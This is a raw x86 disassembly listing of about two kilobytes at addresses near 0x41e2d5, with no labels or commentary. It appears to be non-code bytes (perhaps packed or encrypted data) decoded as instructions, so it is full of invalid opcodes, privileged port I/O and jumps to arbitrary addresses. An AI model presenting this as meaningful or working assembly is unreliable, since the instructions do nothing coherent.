  41e2d5:	add    cl,BYTE PTR [ebp-0x4d]
  41e2d8:	repz retf 
  41e2da:	and    al,0xdd
  41e2dc:	pop    edi
  41e2dd:	mov    esi,0x5e9602f3
  41e2e2:	xchg   DWORD PTR [ecx+0x4d],ebx
  41e2e5:	xchg   esp,eax
  41e2e6:	out    0x2c,eax
  41e2e8:	sub    al,BYTE PTR [ebp-0x9]
  41e2eb:	rcr    BYTE PTR [ecx],1
  41e2ed:	clc    
  41e2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2ef:	and    BYTE PTR [edx],dl
	...
  41e2f9:	add    BYTE PTR [eax],al
  41e2fb:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  41e301:	mov    edi,0xbb1c16fb
  41e306:	shl    BYTE PTR [edi+0x31c613a9],0xa0
  41e30d:	add    DWORD PTR [eax],eax
  41e30f:	scas   al,BYTE PTR es:[edi]
  41e310:	add    BYTE PTR [eax],al
  41e312:	add    BYTE PTR [esi+0x7643e163],bh
  41e318:	and    DWORD PTR [esi+0x50],edi
  41e31b:	cmp    ch,bl
  41e31d:	lds    ebx,FWORD PTR [ebx-0x20]
  41e320:	rcl    DWORD PTR [ecx-0x77],1
  41e323:	mov    dh,ch
  41e325:	mov    ds:0x257c9bb6,eax
  41e32a:	fidiv  WORD PTR [ebx-0x35eab8a1]
  41e330:	cmp    al,0xa
  41e332:	or     BYTE PTR [eax],dh
  41e334:	xchg   eax,ebp
  41e336:	leave  
  41e337:	dec    BYTE PTR [ecx]
  41e339:	popf   
  41e33a:	ds dec ebp
  41e33c:	icebp  
  41e33d:	add    dh,BYTE PTR [ebp+0xc]
  41e340:	sbb    ah,BYTE PTR [ecx+0x47bdf8ef]
  41e346:	jle    0x41e387
  41e348:	pop    es
  41e349:	sbb    al,0x33
  41e34b:	mov    ds:0x5b57b585,eax
  41e350:	pushf  
  41e351:	dec    edi
  41e352:	cmp    ah,BYTE PTR [ecx+edx*4-0x89143df]
  41e359:	and    edx,DWORD PTR [eax+0x3e752ef]
  41e35f:	adc    ah,0xb7
  41e362:	ror    DWORD PTR [esi+0x2c],0x59
  41e366:	jmp    0x98b053b1
  41e36b:	push   0x3683a3b8
  41e370:	jl     0x41e3aa
  41e372:	xor    ebp,ebp
  41e374:	stc    
  41e375:	push   cs
  41e376:	lds    esp,FWORD PTR [edx-0x7089c3db]
  41e37c:	int3   
  41e37d:	bound  esp,QWORD PTR [edi]
  41e37f:	shr    bl,0x6f
  41e382:	outs   dx,BYTE PTR ds:[esi]
  41e383:	push   0xe5c2a470
  41e388:	cli    
  41e389:	arpl   WORD PTR [eax+0x67431ac0],di
  41e38f:	loopne 0x41e390
  41e391:	mov    cl,0x31
  41e393:	sbb    esp,0xbb0c7ea7
  41e399:	and    BYTE PTR [eax+0x7a72ed46],dh
  41e39f:	(bad)  
  41e3a0:	xor    DWORD PTR [edx+ebx*8],esi
  41e3a3:	xor    esp,DWORD PTR [edi+esi*2+0x23]
  41e3a7:	dec    esi
  41e3a8:	and    BYTE PTR ds:0xfdc53ef0,0xbf
  41e3af:	ja     0x41e3e2
  41e3b1:	(bad)  
  41e3b2:	mov    esp,0xdbe0c524
  41e3b7:	imul   ecx,DWORD PTR [ecx],0xfffffff3
  41e3ba:	push   0x2a285b57
  41e3bf:	pusha  
  41e3c0:	fld    QWORD PTR [eax]
	...
  41e3ca:	add    ah,dl
  41e3cc:	sqrtps xmm6,xmm0
  41e3cf:	(bad)  
  41e3d1:	cmc    
  41e3d2:	das    
  41e3d3:	sbb    BYTE PTR [eax],cl
  41e3d5:	xchg   ebx,eax
  41e3d6:	iret   
  41e3d7:	bnd js 0x41e40c
  41e3da:	(bad)  
  41e3db:	fbld   TBYTE PTR [eax+0xae0001]
  41e3e1:	add    BYTE PTR [eax],al
  41e3e3:	xchg   ebp,eax
  41e3e4:	adc    dh,BYTE PTR [esi]
  41e3e6:	mov    edi,0xb45aae54
  41e3eb:	pop    esp
  41e3ec:	in     eax,dx
  41e3ed:	jmp    0x9ace3c05
  41e3f2:	inc    esi
  41e3f3:	inc    esp
  41e3f4:	cmp    DWORD PTR [eax+0x72],esi
  41e3f7:	and    al,0xe8
  41e3f9:	jmp    0xd233:0xeca1d64d
  41e400:	test   BYTE PTR [ebx],cl
  41e402:	cmc    
  41e403:	xchg   edi,eax
  41e404:	mov    ecx,0x1c92369c
  41e409:	cmc    
  41e40a:	dec    DWORD PTR [eax+0x1d716282]
  41e410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e411:	sbb    bl,BYTE PTR [ecx-0x5f]
  41e414:	jo     0x41e491
  41e416:	or     al,0x47
  41e418:	es out dx,al
  41e41a:	mov    ds:0x4c770832,al
  41e41f:	add    DWORD PTR [esi],esi
  41e421:	push   ecx
  41e422:	mov    esp,0xcf49b393
  41e427:	ror    DWORD PTR [edi],1
  41e429:	fild   DWORD PTR [ebx]
  41e42b:	and    al,0x7f
  41e42d:	sbb    eax,0x2cc71a12
  41e432:	xlat   BYTE PTR ds:[ebx]
  41e433:	sbb    eax,ebx
  41e435:	jno    0x41e452
  41e437:	xchg   ebx,eax
  41e438:	adc    edi,DWORD PTR [esi-0x11f8b63d]
  41e43e:	pop    ss
  41e43f:	mov    edx,0x887186a5
  41e444:	sub    ebp,ecx
  41e446:	jmp    0x41e3cc
  41e448:	retf   
  41e449:	mov    edx,0x3dc0e45f
  41e44e:	test   BYTE PTR [ebx],0xbf
  41e451:	fimul  WORD PTR [edx-0x7a]
  41e454:	push   esp
  41e455:	add    al,0x94
  41e457:	mov    al,ds:0x2dd0e76
  41e45c:	js     0x41e47e
  41e45e:	fwait
  41e45f:	adc    ebx,ebx
  41e461:	fxch   st(7)
  41e463:	add    bh,bh
  41e465:	into   
  41e466:	aad    0xb4
  41e468:	(bad)  
  41e469:	add    ebx,DWORD PTR [ebx]
  41e46b:	adc    DWORD PTR [esi-0x2f0b6798],0xffffffe9
  41e472:	or     eax,0x795cd626
  41e477:	and    dl,ch
  41e479:	jnp    0x41e4aa
  41e47b:	xchg   DWORD PTR ds:0xd2a04502,edx
  41e481:	inc    edi
  41e482:	cli    
  41e483:	xchg   dh,dl
  41e485:	xor    BYTE PTR [esi-0x5d],ch
  41e488:	out    dx,al
  41e489:	(bad)  
  41e48a:	daa    
  41e48b:	aam    0x99
  41e48d:	das    
  41e48e:	dec    ebp
  41e48f:	js     0x41e442
	...
  41e499:	add    BYTE PTR [eax],al
  41e49b:	int    0x2d
  41e49d:	xchg   ebp,eax
  41e49e:	inc    ebx
  41e49f:	cmc    
  41e4a0:	sti    
  41e4a1:	fild   QWORD PTR [edi-0x5bdf5fa9]
  41e4a7:	test   al,0x4f
  41e4a9:	lea    ecx,es:[ebp-0x51fffe5f]
  41e4b0:	add    BYTE PTR [eax],al
  41e4b2:	add    BYTE PTR [edx-0x626e5e71],dl
  41e4b8:	data16 jg 0x41e4de
  41e4bb:	test   BYTE PTR [edi+edi*2+0x1c],dh
  41e4bf:	sbb    al,0x8c
  41e4c1:	(bad)  
  41e4c2:	pusha  
  41e4c3:	jbe    0x41e4bb
  41e4c5:	lea    ecx,[ecx-0x52]
  41e4c8:	push   0xffffff9e
  41e4ca:	lods   eax,DWORD PTR ds:[esi]
  41e4cb:	fdivrp st(6),st
  41e4cd:	fcomp  QWORD PTR [esi-0x3477eb22]
  41e4d3:	push   ebx
  41e4d4:	push   ebx
  41e4d5:	fdivr  QWORD PTR ds:0xd4da7eb8
  41e4db:	inc    eax
  41e4dc:	mov    eax,ds:0x2d50a8d6
  41e4e1:	add    BYTE PTR [edi+0x55],cl
  41e4e4:	adc    esp,DWORD PTR [esi-0xba808f5]
  41e4ea:	popa   
  41e4eb:	add    DWORD PTR ds:0x17828d80,esp
  41e4f1:	xchg   edi,eax
  41e4f2:	and    al,0xdf
  41e4f4:	imul   esp,DWORD PTR [ecx+eax*4+0x24b8e755],0x75e965b4
  41e4ff:	sti    
  41e500:	mov    esi,0x90870b9f
  41e505:	ret    
  41e506:	mov    ch,0x4
  41e508:	mov    al,dl
  41e50a:	add    BYTE PTR [ebx+0x4f421c82],dh
  41e510:	add    dh,ch
  41e512:	les    esp,FWORD PTR ds:0x9b864005
  41e518:	or     al,0xf
  41e51a:	xchg   ecx,eax
  41e51b:	ret    0xf957
  41e51e:	std    
  41e51f:	mov    ebx,0x90be3fed
  41e524:	jmp    0xda8c1c57
  41e529:	and    al,0x9f
  41e52b:	es cmp eax,0x8fe72d63
  41e531:	pushf  
  41e532:	jmp    0xaa13:0xaf18d112
  41e539:	sar    esi,0xb0
  41e53c:	stos   DWORD PTR es:[edi],eax
  41e53d:	add    DWORD PTR [edx+0x5c431d74],esp
  41e543:	inc    ebp
  41e544:	mov    al,ds:0xeb5d1cfc
  41e549:	div    BYTE PTR [edx-0x306ff6d2]
  41e54f:	retf   
  41e550:	sahf   
  41e551:	aad    0x48
  41e553:	xor    BYTE PTR [edi+0xc],bh
  41e556:	mov    ds:0x72cb88cb,eax
  41e55b:	test   BYTE PTR [esi],ch
  41e55d:	call   0x0:0x779a2e
  41e564:	add    BYTE PTR [eax],al
  41e566:	add    BYTE PTR [eax],al
  41e568:	add    BYTE PTR [eax],al
  41e56a:	add    BYTE PTR [ebx],dl
  41e56c:	fs out 0xb,eax
  41e56f:	test   DWORD PTR [ebx-0xce58301],0x86734cfc
  41e579:	xor    al,0x27
  41e57b:	cmp    esp,DWORD PTR [edx+0xae0001]
  41e581:	add    BYTE PTR [eax],al
  41e583:	lock pop esp
  41e585:	dec    edx
  41e586:	bound  edx,QWORD PTR [edi]
  41e588:	icebp  
  41e589:	retf   
  41e58a:	jg     0x41e5f7
  41e58c:	sbb    esi,DWORD PTR [ebp-0x3ff68dee]
  41e592:	adc    al,0xdf
  41e594:	fisttp DWORD PTR [ecx]
  41e596:	lahf   
  41e597:	inc    esp
  41e598:	sub    eax,0x3c197065
  41e59d:	xchg   esp,eax
  41e59e:	mov    fs,WORD PTR [edx-0x71]
  41e5a1:	adc    bl,al
  41e5a3:	lds    edi,FWORD PTR [esi]
  41e5a5:	or     ebx,esp
  41e5a7:	dec    edi
  41e5a8:	int3   
  41e5a9:	out    0x1f,al
  41e5ab:	sub    eax,0xb2144ddd
  41e5b0:	sbb    BYTE PTR [ebx+0x8320b2],cl
  41e5b6:	adc    ah,BYTE PTR [esi-0x43]
  41e5b9:	loop   0x41e5eb
  41e5bb:	dec    ebx
  41e5bc:	jmp    0x9286:0xa14d72ae
  41e5c3:	ds push ecx
  41e5c5:	popf   
  41e5c6:	dec    ebx
  41e5c7:	sbb    BYTE PTR [eax+edx*4],bh
  41e5ca:	xor    eax,0xc89400d6
  41e5cf:	add    edi,ebp
  41e5d1:	imul   esp,DWORD PTR ds:0x156df073,0xe2bea2ab
  41e5db:	pusha  
  41e5dc:	daa    
  41e5dd:	sbb    al,0x6c
  41e5df:	iret   
  41e5e0:	test   dl,ah
  41e5e2:	scas   eax,DWORD PTR es:[edi]
  41e5e3:	repz fisttp WORD PTR [ebx-0x29b51fb9]
  41e5ea:	lods   eax,DWORD PTR ds:[esi]
  41e5eb:	mov    edx,0x5cf1674
  41e5f0:	push   esp
  41e5f1:	enter  0xbc5f,0xa5
  41e5f5:	pop    ecx
  41e5f6:	xchg   esi,eax
  41e5f7:	repnz dec eax
  41e5f9:	push   ds
  41e5fa:	or     al,0xd0
  41e5fc:	sti    
  41e5fd:	arpl   sp,bp
  41e5ff:	xor    DWORD PTR [ecx-0x18ef590b],esp
  41e605:	iret   
  41e606:	outs   dx,DWORD PTR ds:[esi]
  41e607:	mov    esi,0xb144b013
  41e60c:	mov    eax,0x341c578c
  41e611:	aad    0x5c
  41e613:	cs out 0x18,eax
  41e616:	jns    0x41e5bb
  41e618:	dec    eax
  41e619:	dec    ecx
  41e61a:	div    BYTE PTR [ecx+0x33]
  41e61d:	xchg   esi,eax
  41e61e:	dec    eax
  41e61f:	jl     0x41e5e5
  41e621:	jg     0x41e5be
  41e623:	push   edi
  41e624:	xchg   DWORD PTR [esi],ebx
  41e626:	frndint 
  41e628:	mov    BYTE PTR [ecx],ah
  41e62a:	lods   al,BYTE PTR ds:[esi]
  41e62b:	jnp    0x41e5e2
  41e62d:	sub    al,BYTE PTR [ecx+ecx*4]
  41e630:	push   ss
	...
  41e639:	add    BYTE PTR [eax],al
  41e63b:	add    dl,BYTE PTR ss:[ebp+0xc]
  41e63f:	jne    0x41e6a0
  41e641:	jg     0x41e67d
  41e643:	clc    
  41e644:	cs aas 
  41e646:	push   0x155f15bf
  41e64b:	jno    0x41e5d7
  41e64d:	add    DWORD PTR [eax],eax
  41e64f:	scas   al,BYTE PTR es:[edi]
  41e650:	add    BYTE PTR [eax],al
  41e652:	add    BYTE PTR [eax],bl
  41e654:	mov    ecx,0xd24027b8
  41e659:	jl     0x41e66b
  41e65b:	mov    ch,BYTE PTR [edx+0x4c007947]
  41e661:	mov    dl,0xbd
  41e663:	test   BYTE PTR [edx+0x3a2e88c3],al
  41e669:	sahf   
  41e66a:	ret    
  41e66b:	sahf   
  41e66c:	jno    0x41e637
  41e66e:	jo     0x41e6e7
  41e670:	dec    eax
  41e671:	sbb    ebx,DWORD PTR [eax-0x43b3f478]
  41e677:	sub    BYTE PTR [ebp-0x4b3dc37d],bl
  41e67d:	push   ebp
  41e67e:	mov    cl,0x8e
  41e680:	sub    eax,0x5347f06e
  41e685:	dec    ecx
  41e686:	mov    eax,ds:0x9d972207
  41e68b:	xlat   BYTE PTR ds:[ebx]
  41e68c:	add    BYTE PTR ds:0x7b62e56b,ch
  41e692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e693:	xor    ah,BYTE PTR [esi+0x6e]
  41e696:	fisttp QWORD PTR [edi+0x1c22b0e]
  41e69c:	or     edi,DWORD PTR [ebp+0x192a45cc]
  41e6a2:	hlt    
  41e6a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6a4:	ret    
  41e6a5:	ss pop ecx
  41e6a7:	xchg   esp,eax
  41e6a8:	repnz mov DWORD PTR [esi],eax
  41e6ab:	ret    0xadab
  41e6ae:	add    ecx,DWORD PTR [ebp-0x67652316]
  41e6b4:	pop    esi
  41e6b5:	out    0x25,eax
  41e6b7:	fadd   DWORD PTR [edx-0x10]
  41e6ba:	test   DWORD PTR [ebp+eiz*1+0x57fa804f],0x16733767
  41e6c5:	fs pop ecx
  41e6c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6c8:	and    al,0x35
  41e6ca:	sub    al,0xc0
  41e6cc:	mov    bl,0xdd
  41e6ce:	das    
  41e6cf:	call   0x6c69:0xb4ea6aa1
  41e6d6:	adc    ebx,DWORD PTR [esi]
  41e6d8:	retf   0xc9ee
  41e6db:	jge    0x41e67f
  41e6dd:	je     0x41e734
  41e6df:	and    DWORD PTR ds:0xda0e2c47,ebp
  41e6e5:	neg    BYTE PTR [esi-0x39ca3628]
  41e6eb:	imul   esi,DWORD PTR [ebx-0x3e],0xca5ab516
  41e6f2:	adc    ah,al
  41e6f4:	jne    0x41e6be
  41e6f6:	add    eax,0x58e51be
  41e6fb:	jge    0x41e713
  41e6fd:	jmp    0x0:0x7d2c56
  41e704:	add    BYTE PTR [eax],al
  41e706:	add    BYTE PTR [eax],al
  41e708:	add    BYTE PTR [eax],al
  41e70a:	add    BYTE PTR [eax],cl
  41e70c:	mov    cl,0x72
  41e70e:	cmp    edi,ebx
  41e710:	sti    
  41e711:	dec    ecx
  41e712:	mov    bl,0x94
  41e714:	je     0x41e6ed
  41e716:	call   0x8b1f:0xa45f6561
  41e71d:	add    DWORD PTR [eax],eax
  41e71f:	scas   al,BYTE PTR es:[edi]
  41e720:	add    BYTE PTR [eax],al
  41e722:	add    ah,bl
  41e724:	mov    ah,0xe9
  41e726:	rcr    bh,cl
  41e728:	jns    0x41e6f8
  41e72a:	pop    esi
  41e72b:	arpl   WORD PTR [ebp-0x4620a5dd],bp
  41e731:	sub    edx,DWORD PTR ds:0x93f1cb47
  41e737:	sbb    BYTE PTR [edi],ah
  41e739:	scas   al,BYTE PTR es:[edi]
  41e73a:	(bad)
  41e73d:	sbb    dh,BYTE PTR [ecx]
  41e73f:	jb     0x41e722
  41e741:	fistp  DWORD PTR [ebp-0x21]
  41e744:	push   es
  41e745:	sub    eax,0x6fdedce9
  41e74a:	adc    edx,DWORD PTR [eax-0x4d]
  41e74d:	in     eax,dx
  41e74e:	push   es
  41e74f:	loop   0x41e6e0
  41e751:	mov    bh,ch
  41e753:	inc    ecx
  41e754:	in     al,dx
  41e755:	jb     0x41e7a0
  41e757:	pop    edx
  41e758:	push   ss
  41e759:	aas    
  41e75a:	stc    
  41e75b:	test   al,0x81
  41e75d:	xchg   ebx,eax
  41e75e:	(bad)
  41e761:	sub    eax,0x8137e86e
  41e766:	in     eax,dx
  41e767:	jo     0x41e739
  41e769:	in     eax,dx
  41e76a:	mov    bl,0x2e
  41e76c:	(bad)  
  41e76d:	scas   eax,DWORD PTR es:[edi]
  41e76e:	push   eax
  41e76f:	pop    ecx
  41e770:	es sub al,0x38
  41e773:	fist   WORD PTR [ecx-0x178c0464]
  41e779:	cmp    BYTE PTR ds:0xdb212e7a,ah
  41e77f:	and    BYTE PTR [edx-0x7e37c5d9],dh
  41e785:	mov    ebp,0x13f6511e
  41e78a:	add    eax,0x7ea870d0
  41e78f:	sar    DWORD PTR [eax+0x30521f58],1
  41e795:	and    eax,DWORD PTR [eax+ecx*1]
  41e798:	ins    BYTE PTR es:[edi],dx
  41e799:	mov    ebx,0x60491095
  41e79e:	imul   BYTE PTR [ecx+eiz*2-0x5f]
  41e7a2:	lea    ecx,[esi]
  41e7a4:	popa   
  41e7a5:	mov    bh,0x2
  41e7a7:	add    al,0xec
  41e7a9:	sbb    eax,0xa027239f
  41e7ae:	stos   BYTE PTR es:[edi],al
  41e7af:	(bad)  
  41e7b0:	loopne 0x41e7b6
  41e7b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7b3:	mov    al,ds:0x4cc6d4a3
  41e7b8:	or     edi,ebx
  41e7ba:	dec    esi
  41e7bb:	xor    al,0x78
  41e7bd:	fimul  DWORD PTR [esi+0xb69942e]
  41e7c3:	adc    ecx,eax
  41e7c5:	mov    bh,0x14
  41e7c7:	pusha  
  41e7c8:	cmp    ebx,esi
  41e7ca:	cmc    
  41e7cb:	dec    ecx
  41e7cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7cd:	scas   al,BYTE PTR es:[edi]
  41e7ce:	dec    eax
  41e7cf:	xlat   BYTE PTR ds:[ebx]
  41e7d0:	inc    DWORD PTR [eax]
	...
  41e7da:	add    bh,bl
  41e7dc:	push   ebx
  41e7dd:	mov    dl,0x4f
  41e7df:	mov    esi,0x67d3ffef
  41e7e4:	xchg   ecx,edi
  41e7e6:	adc    al,0xc8
  41e7e8:	imul   ecx,DWORD PTR [esi+0x3b],0x18bcd
  41e7ef:	scas   al,BYTE PTR es:[edi]
  41e7f0:	add    BYTE PTR [eax],al
  41e7f2:	add    BYTE PTR [ebp-0x2e0b52f8],bh
  41e7f8:	retf   
  41e7f9:	dec    esp
  41e7fa:	cli    
  41e7fb:	aaa    
  41e7fc:	jbe    0x41e7c5
  41e7fe:	dec    esi
  41e7ff:	pop    esp
  41e800:	into   
  41e801:	jecxz  0x41e87b
  41e803:	daa    
  41e804:	rcl    BYTE PTR [esi+ecx*4],cl
  41e807:	(bad)  
  41e808:	xchg   edx,eax
  41e809:	jb     0x41e798
  41e80b:	mov    bh,0xec
  41e80d:	sub    al,0x76
  41e80f:	mov    ebp,DWORD PTR [ebp+0xe]
  41e812:	mov    bh,0xd3
  41e814:	mov    ebp,0x616fc01f
  41e819:	or     al,0x3d
  41e81b:	cmp    al,0x73
  41e81d:	sar    DWORD PTR [edx+0x501f50a9],1
  41e823:	inc    ebx
  41e824:	cmp    al,0x2c
  41e826:	loop   0x41e7b9
  41e828:	mov    edx,0x5518640f
  41e82d:	ss adc eax,0xde3a5bbb
  41e833:	aas    
  41e834:	push   ds
  41e835:	mov    ds:0xadb33b8c,eax
  41e83a:	jl     0x41e7c8
  41e83c:	jb     0x41e823
  41e83e:	arpl   dx,bx
  41e840:	lea    ebx,[esi+0x70520b0a]
  41e846:	mov    eax,ds:0x2b6886b8
  41e84b:	mov    cl,0xae
  41e84d:	dec    ebp
  41e84e:	cdq    
  41e84f:	and    BYTE PTR [esi+ebx*8-0x20],cl
  41e853:	xchg   ecx,eax
  41e854:	lods   eax,DWORD PTR ds:[esi]
  41e855:	or     edi,DWORD PTR [eax+0x7f]
  41e858:	dec    eax
  41e859:	adc    DWORD PTR [edx],ecx
  41e85b:	rcl    DWORD PTR [edi],cl
  41e85d:	pop    ss
  41e85e:	sar    BYTE PTR [eax-0x1ccfd959],cl
  41e864:	push   esp
  41e865:	mov    dh,BYTE PTR [ecx-0x41]
  41e868:	and    al,0x68
  41e86a:	xor    al,0xfd
  41e86c:	ja     0x41e884
  41e86e:	out    0x3a,eax
  41e870:	rcr    BYTE PTR [edx-0x32b7b2e1],0x1d
  41e877:	adc    DWORD PTR [edi+0x29],eax
  41e87a:	pop    es
  41e87b:	push   0x7
  41e87d:	jbe    0x41e872
  41e87f:	sbb    cl,dh
  41e881:	mov    esi,0x7a8b7475
  41e886:	mov    ds,WORD PTR [ebx-0x7e]
  41e889:	sub    ah,cl
  41e88b:	rol    BYTE PTR [edi],cl
  41e88d:	inc    edi
  41e88e:	xchg   bl,dl
  41e890:	push   0xbee8629e
  41e895:	ja     0x41e867
  41e897:	mov    WORD PTR [esi+0x1085e796],fs
  41e89d:	or     BYTE PTR [edx+0x441f],0x0
  41e8a4:	add    BYTE PTR [eax],al
  41e8a6:	add    BYTE PTR [eax],al
  41e8a8:	add    BYTE PTR [eax],al
  41e8aa:	add    BYTE PTR [edi-0x24252cf4],al
  41e8b0:	fisttp WORD PTR [edi+0x640ccb5d]
  41e8b6:	push   ss
  41e8b7:	scas   eax,DWORD PTR es:[edi]
  41e8b8:	pop    ds
  41e8b9:	cmp    DWORD PTR [edi],esp
  41e8bb:	jnp    0x41e849
  41e8bd:	add    DWORD PTR [eax],eax
  41e8bf:	scas   al,BYTE PTR es:[edi]
  41e8c0:	add    BYTE PTR [eax],al
  41e8c2:	add    ch,ch
  41e8c4:	xchg   edx,eax
  41e8c5:	and    ebx,DWORD PTR [edi+edx*1-0x69b23547]
  41e8cc:	into   
  41e8cd:	ret    
  41e8ce:	dec    esp
  41e8cf:	pop    edi
  41e8d0:	nop
  41e8d1:	test   al,0x4b
  41e8d3:	pushf  
  41e8d4:	cmc    
  41e8d5:	ret    0x8e4
  41e8d8:	jmp    0x41e85b
  41e8da:	clc    
  41e8db:	and    al,0x5b
  41e8dd:	dec    ebp
  41e8de:	or     eax,0x72522cb2
  41e8e3:	call   0xfe7ca3f5
  41e8e8:	adc    eax,0x72cb6020
  41e8ed:	ret    
  41e8ee:	loopne 0x41e963
  41e8f0:	sub    eax,0x108e335b
  41e8f5:	shr    BYTE PTR [esi],0x83
  41e8f8:	dec    ecx
  41e8f9:	or     eax,ebx
  41e8fb:	add    al,0x1d
  41e8fd:	addr16 inc esp
  41e8ff:	fidiv  DWORD PTR [edx-0x49]
  41e902:	adc    al,0x8f
  41e904:	ja     0x41e937
  41e906:	xor    DWORD PTR [edx],esp
  41e908:	jp     0x41e985
  41e90a:	xchg   ebx,eax
  41e90b:	ins    DWORD PTR es:[edi],dx
  41e90c:	mov    al,ds:0xf94caa33
  41e911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e912:	scas   al,BYTE PTR es:[edi]
  41e913:	pop    esp
  41e914:	mov    dl,0x1c
  41e916:	dec    ebp
  41e917:	outs   dx,DWORD PTR ds:[esi]
  41e918:	in     al,dx
  41e919:	xor    cl,0xb6
  41e91c:	add    eax,0x42d31049
  41e921:	push   esp
  41e922:	adc    dl,BYTE PTR [ebx]
  41e924:	cmp    al,0xe7
  41e926:	outs   dx,DWORD PTR ds:[esi]
  41e927:	adc    ecx,DWORD PTR [ecx+eiz*2+0x5452e86c]
  41e92e:	lods   al,BYTE PTR ds:[esi]
  41e92f:	pop    esi
  41e930:	or     BYTE PTR [ebp+eax*8-0x44],bh
  41e934:	push   esi
  41e935:	push   esp
  41e936:	mov    dl,0xe2
  41e938:	loope  0x41e968
  41e93a:	mov    bh,0x70
  41e93c:	imul   ebp,eax,0x60cc4b13
  41e942:	and    DWORD PTR ds:0x523abec4,esi
  41e948:	test   al,0xf2
  41e94a:	add    eax,0xcdc89260
  41e94f:	push   cs
  41e950:	in     al,0x30
  41e952:	inc    ecx
  41e953:	scas   eax,DWORD PTR es:[edi]
  41e954:	ins    BYTE PTR es:[edi],dx
  41e955:	and    BYTE PTR [ecx],al
  41e957:	in     eax,dx
  41e958:	cdq    
  41e959:	push   esi
  41e95a:	sub    BYTE PTR ds:0xa15cdd8,dh
  41e960:	fsubr  DWORD PTR [ecx]
  41e962:	jnp    0x41e9e1
  41e964:	add    ah,BYTE PTR [ebx+0x5b]
  41e967:	(bad)  
  41e968:	dec    edi
  41e969:	(bad)  
  41e96a:	pop    esp
  41e96b:	sub    eax,0xe21696d1
  41e970:	test   DWORD PTR [eax],eax
	...
  41e97a:	add    BYTE PTR [edi-0x28db29d],bl
  41e980:	jle    0x41e941
  41e982:	out    dx,eax
  41e983:	sbb    edi,esp
  41e985:	mov    BYTE PTR [ebx+ebp*2+0x294dbd21],dh
  41e98c:	lea    eax,[ecx]
  41e98e:	add    BYTE PTR [esi+0x6e000000],ch
  41e994:	sbb    cl,bl
  41e996:	sbb    ebx,0x4a
  41e999:	cld    
  41e99a:	enter  0xb41d,0xcf
  41e99e:	or     eax,0x99f83f75
  41e9a3:	xchg   edi,eax
  41e9a4:	or     al,0xaf
  41e9a6:	pop    ds
  41e9a7:	sub    al,0x3a
  41e9a9:	xor    eax,0x94483dfe
  41e9ae:	push   ebp
  41e9af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b0:	loope  0x41e957
  41e9b2:	jno    0x41e9df
  41e9b4:	fs ret 0x96fd
  41e9b8:	js     0x41e945
  41e9ba:	pop    esp
  41e9bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9bc:	sbb    BYTE PTR [ecx+0x2a55762f],ch
  41e9c2:	ret    0x5c68
  41e9c5:	and    ebx,DWORD PTR [ecx+0x6a]
  41e9c8:	in     eax,0x99
  41e9ca:	stos   BYTE PTR es:[edi],al
  41e9cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e9cc:	push   cs
  41e9cd:	pushf  
  41e9ce:	fldenv [edi-0x69]
  41e9d1:	add    al,0xcb
  41e9d3:	inc    esi
  41e9d4:	(bad)  
  41e9d5:	mov    dl,0x49
  41e9d7:	je     0x41e961
  41e9d9:	stos   BYTE PTR es:[edi],al
  41e9da:	and    BYTE PTR [eax-0xc62e74b],0x41
  41e9e1:	push   esi
  41e9e2:	mov    bl,0x94
  41e9e4:	inc    edx
  41e9e5:	out    0xe,al
  41e9e7:	push   ds
  41e9e8:	clc    
  41e9e9:	inc    edi
  41e9ea:	cmp    al,0x3d
  41e9ec:	aad    0x61
  41e9ee:	sbb    dl,BYTE PTR [ebx+0x2b]
  41e9f1:	ds dec ecx
  41e9f3:	add    eax,0x872b67a6
  41e9f8:	and    DWORD PTR [ebp-0x56eec504],0x19f96bbb
  41ea02:	sub    BYTE PTR [ecx-0x54],cl
  41ea05:	cs mov eax,0x1eb6e74a
  41ea0b:	inc    eax
  41ea0c:	lea    ebp,[eax+0x771746be]
  41ea12:	jmp    0x41ea03
  41ea14:	shl    BYTE PTR [ebp+0x1f4e4da9],cl
  41ea1a:	cmp    DWORD PTR [eax+0x77652912],ebp
  41ea20:	je     0x41e9a9
  41ea22:	mov    dx,0x262b
  41ea26:	loop   0x41ea97
  41ea28:	jne    0x41ea72
  41ea2a:	xor    bh,bh
  41ea2c:	repnz xchg ebp,eax
  41ea2e:	inc    edx
  41ea2f:	iret   
  41ea30:	and    al,0x6c
  41ea32:	mov    DWORD PTR [edx+0x18767986],ebx
  41ea38:	push   0xffffffb6
  41ea3a:	cwde   
  41ea3b:	jge    0x41eaa1
  41ea3d:	cmp    al,0xa2
  41ea3f:	mov    ds:0x40,eax
  41ea44:	add    BYTE PTR [eax],al
  41ea46:	add    BYTE PTR [eax],al
  41ea48:	add    BYTE PTR [eax],al
  41ea4a:	add    BYTE PTR [eax+0x23],dh
  41ea4d:	and    eax,0x7c6f7769
  41ea52:	cmp    esp,DWORD PTR [eax+0x19bcee1c]
  41ea58:	lds    edx,FWORD PTR [eax]
  41ea5a:	test   eax,0x18dd7
  41ea5f:	scas   al,BYTE PTR es:[edi]
  41ea60:	add    BYTE PTR [eax],al
  41ea62:	add    BYTE PTR [eax+0x4d],ah
  41ea65:	dec    edx
  41ea66:	mov    ds:0x44058f2a,eax
  41ea6b:	aaa    
  41ea6c:	cmp    al,0xf4
  41ea6e:	inc    edx
  41ea6f:	adc    BYTE PTR ds:0x3c72deb0,0xbf
  41ea76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea77:	pop    ebx
  41ea78:	outs   dx,DWORD PTR ds:[esi]
  41ea79:	jbe    0x41eac6
  41ea7b:	xor    dh,BYTE PTR ds:0x5a073cbf
  41ea81:	pop    es
  41ea82:	int    0x3d
  41ea84:	pop    ebx
  41ea85:	add    eax,0x1bda1767
  41ea8a:	or     DWORD PTR [ecx+0x7f],ebp
  41ea8d:	(bad)  
  41ea8e:	sbb    DWORD PTR [edi-0x4b],ebx
